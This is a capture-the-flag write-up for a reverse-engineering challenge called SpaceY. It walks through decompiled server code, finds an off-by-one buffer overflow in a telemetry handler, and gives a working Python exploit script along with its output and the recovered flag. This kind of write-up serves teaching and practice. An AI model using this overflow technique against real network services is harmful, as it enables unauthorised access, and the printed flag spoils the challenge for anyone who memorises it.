# Trellix SpaceY Write Up

## Details:

Jeopardy style CTF

Category: Reverse Engineering

Comments:

```
In their attempts to track down the remaining pieces of Anubis, the K9's have launched their own secret Low Earth Orbit (LEO) nanosat, or nano satellite, under the name SpaceY. According to their documentation, the nanosat is using validated COTS (Commercial Off-the-Shelf) components, and fuzzing the NOSP (Nanosatellite Space Protocol) used by the device exposed no vulnerabilties. The documentation also reveals that SpaceY has basic functionality for remotely checking the satellite bus and payload status as well as sending a telemetry config file and device control.

Luckily, you are not starting completely black box with a remote device in space! A fellow agent has retrieved the protocol specification, satellite firmware, and a sample python client for communicating with the nanosat via OSINT. Your mission is to get access to the control service functionality so we can paws their progress!

You can access their satellite at 0.cloud.chals.io:34357.
```

## Write up:

As this was a reversing challenge, my first step was to open the program in a decompiler and look at the main function. After a bit of renaming and retyping using the socket system calls I ended up with the following:

```c
08049206  int32_t main(int32_t argc, char** argv, char** envp)
08049226      int32_t fd = socket(fd: 2, type: 1, domain: 0)
08049234      if (fd == -1)
0804923d          puts(str: "socket creation failed...")
08049249          exit(status: 0)
08049249          noreturn
08049255      puts(str: "Socket successfully created..")
08049269      struct sockaddr var_20
08049269      bzero(&var_20, 0x10)
0804926e      var_20.sa_family = 2
08049281      var_20.sa_data[2].d = htonl(0)
08049291      var_20.sa_data[0].w = htons(5555)
080492b4      if (bind(fd: fd, addr: &var_20, len: 0x10) != 0)
080492bd          puts(str: "socket bind failed...")
080492c9          exit(status: 0)
080492c9          noreturn
080492d5      puts(str: "Socket successfully binded..")
080492f0      if (listen(fd: argc, backlog: 5) != 0)
080492f9          puts(str: "Listen failed...")
08049305          exit(status: 0)
08049305          noreturn
08049311      puts(str: "Server listening..")
08049316      argc = 0x10
08049377      int32_t eax_7
08049377      while (true)
08049377          argv = accept(fd: envp, addr: &var_20.sa_data[2], len: &argc)
08049381          if (argv == 0)
08049389              if (argv s< 0)
08049392                  puts(str: "server accept failed...")
0804939e                  exit(status: 0)
0804939e                  noreturn
080493aa              puts(str: "server accept the client...")
080493af              eax_7 = 0
08049387              break
08049346          if (pthread_create(newthread: &var_20, attr: nullptr, start_routine: start_routine, arg: &argv) s< 0)
0804934f              perror(s: "accept failed")
08049354              eax_7 = 1
08049359              break
080493b5      return eax_7
```

The main function binded itself to port 5555 and then started istening for connections, when the program got a connection it would then create a new thread using the start_routine function. The main function didn't have anything else too interesting in it so I then went to the start_routine function:

```c
08048ead  void* start_routine(void* arg1)
...
08049084      write(fd: eax_5, buf: &var_47f, nbytes: strlen(&var_47f))
080491e9      ssize_t eax_36
080491e9      while (true)
080491e9          eax_36 = read(fd: eax_5, buf: &var_434, nbytes: 0x103)
080491f5          if (eax_36 s<= 0)
080491f5              break
08049094          var_4d8 = &var_434
080490a3          uint32_t service = zx.d(*var_4d8)
080490a9          if (service u<= 5)
080490af              switch (service)
080490cf                  case 1
080490cf                      bus(eax_5, *(var_4d8 + 2))
080490d4                      continue
080490f0                  case 2
080490f0                      payload(eax_5, *(var_4d8 + 2))
080490f5                      continue
08049101                  case 3
08049101                      if (eax_36 s<= 0x102)
0804911b                          write(fd: eax_5, buf: &var_4d3, nbytes: 0x54)
08049126                          disconnect(eax_5)
08049163                      telemetry(eax_5, &var_1c95, &var_4dc, *(var_4d8 + 2), var_4d8 + 3)
08049195                  case 4
08049195                      flag(eax_5, var_20, *(var_4d8 + 2), var_4d8 + 3)
0804919a                      continue
080491a2                  case 5
080491a2                      disconnect(eax_5)
080491a7                      continue
080491c1          write(fd: eax_5, buf: &var_4d3, nbytes: 0x54)
080491cc          disconnect(eax_5)
08049205      return eax_36
```

Most of the function was just initializing values and setting up the error strings so we could just ignore it. At the bottom of this function I found the above switch case which after looking through the python file that we use to connect and the individual functions a bit I was able to decipher. My first step here now was to look into the flag function to see what condition we need to satisfy in order to get our flag:

```c
08048cff  int32_t flag(int32_t arg1, char* if_send_flag, char fragment_id, int32_t data)
...
08048dac      if (fragment_id != 0)
08048dc6          write(fd: arg1, buf: &var_bb, nbytes: 0x4b)
08048dd1          disconnect(arg1)
08048dfa      void var_e2
08048dfa      for (void* var_24_1 = nullptr; var_24_1 s<= 0x25; var_24_1 = var_24_1 + 1)
08048deb          *(&var_e2 + var_24_1) = *(var_24_1 + data)
08048e2d      void flag
08048e2d      fgets(buf: &flag, n: 0x27, fp: fopen(filename: "access.txt", mode: &data_8049697))
08048e4c      if (strcmp(&flag, &var_e2) == 0)
08048e51          *if_send_flag = 1
08048e5c      if (*if_send_flag != 1)
08048e92          write(fd: arg1, buf: &access_denied_str, nbytes: 0x4c)
08048e76      else
08048e76          write(fd: arg1, buf: &flag, nbytes: 0x27)
08048eac      return disconnect(arg1)
```

This function was similar to the last one, where it had lots of code to intialize different things, but after renaming and cleaning up the code I saw the above. First we check that the fragment id equals 0, if it does not then we disconnect. We then read in something called access.txt (which is most likely our flag) and compare that value against our input data. If the data is the same as the flag then we set a byte to 1 and if that byte is 1 we print out the flag, otherwise we print that we do not have access. This function does not give us anymore information that we can use to reverse our flag so unless we want to try brute forcing we need to find some way to set the if_send_flag value to true.

To do this I went back to the main function and looked through the other functions a bit to see if there was anything interesting in any of the other functions:

1. bus - The bus function disconnects at the end of the function so we won't be able to use it to set something since we won't be able to call the flag function afterwards.
2. payload - The payload function disconnects at the end of the function so we won't be able to use it to set something since we won't be able to call the flag function afterwards.
3. telemetry - The telemetry function was the only function that did not terminate the program at the end of the function so I knew whatever I would need to do was in this function.

The telemetry function had a lot of the same initialization components as the other functions so I am going to ommit those again. But after a bit of renaming variables and retyping values I ended up with the following:

```c
08048b76  int32_t telemetry(int32_t fd, void* buffer, int32_t increment_each_send, int32_t fragment_id, void* src)
...
08048c6c      if (fragment_id u> 0xb || (fragment_id u<= 0xb && *increment_each_send s> 0xc))
08048ce4          write(fd: fd, buf: &var_6a, nbytes: 0x4e)
08048cef          eax_16 = disconnect(fd)
08048c6c      if (fragment_id u<= 0xb && *increment_each_send s<= 0xc)
08048c8b          memmove((*increment_each_send << 8) + buffer, src, 0x100)
08048c98          if (*increment_each_send == 0xc)
08048cb2              write(fd: fd, buf: &var_b5, nbytes: 0x4b)
08048cba              *increment_each_send = 0
08048cc8          eax_16 = increment_each_send
08048ccb          *eax_16 = *increment_each_send + 1
08048cfe      return eax_16
```

If the fragment_id is greater than 0xb we exit the program. We also check the increment_each_send value to see if we have sent 13 times (this is where the error is, they check for 12 and in their python connection you can see the count is set to a max value of 12 but they start their count at 0). Each time we send data it copies 256 bytes from our src to a location in memory. From this we can see that we will need to perform some sort of overflow in the telemetry function in order to set the bool check in the flag function to true.

For this challenge I really wanted to be the one who got first blood so rather than trying to calculate out everything I just decided to send a bunch of \x01's as the payload and ended up modifying their script to look like:

```py
# get all imports
import socket
from ctypes import *
import time

''''Procotol Services'''
bus_service = b'\x01'
payload_service = b'\x02'
telemetry_service = b'\x03'
control_service = b'\x04'
disconnect_service = b'\x05'

'''Protocol fields'''
length = b'\x12'
fragment_id = b'\x00'
data = b'\x01'*256

# create the socker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the server
def connect(sock):
    server_address = ("0.cloud.chals.io", 34357)
    sock.connect(server_address)

# call the connection function
connect(sock)

# send our data 13 times to overwrite the bool
count = 0
while count < 13:
    packet = telemetry_service + length + fragment_id + data
    sock.send(packet)
    count = count+1
    time.sleep(0.2)#must keep this delay between packets for tranmission sync with satellite
    
# send the get flag command
packet = control_service + length + b'\x00' + data
sock.send(packet)

# get the return value
count = 0
while count <=3:
    data = sock.recv(74)
    print(data)
    count = count+1
    time.sleep(0.2)#must keep this delay between packets for tranmission sync with
```

When run this returned:

```
b'You are now connected to the SpaceY Nanosat in LEO........................'
b'File received - if no more files then send disconnect.....................'
b'\x00ATR[GroundControlNowCanAccessMajorTom]\x00SpaceY nanosat disconnecting......'
b'........................................\x00'
```

With the flag being:

```
ATR[GroundControlNowCanAccessMajorTom]
```